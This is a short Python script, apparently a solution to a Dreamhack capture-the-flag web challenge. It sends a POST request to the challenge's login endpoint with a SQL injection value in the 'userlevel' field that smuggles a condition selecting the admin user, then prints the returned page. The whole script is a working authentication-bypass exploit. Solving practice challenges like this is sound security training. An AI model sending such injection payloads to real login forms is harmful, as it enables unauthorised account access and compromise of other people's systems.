import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:8241"
    res = requests.post(url+'/login', {"userlevel": "0' and userid='admin"})
    print(BeautifulSoup(res.content, 'html.parser').prettify())

